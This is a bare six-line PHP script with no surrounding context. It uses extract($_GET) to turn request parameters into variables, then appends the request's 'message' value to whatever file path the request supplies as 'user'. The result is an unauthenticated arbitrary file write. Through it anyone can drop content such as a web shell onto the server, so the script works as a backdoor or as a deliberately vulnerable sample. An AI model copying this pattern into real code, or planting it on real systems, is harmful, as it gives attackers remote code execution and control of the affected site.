<?php
    extract($_GET);
    $fp = fopen($user, 'a');
    fwrite($fp, $message);
    fclose($fp);
?>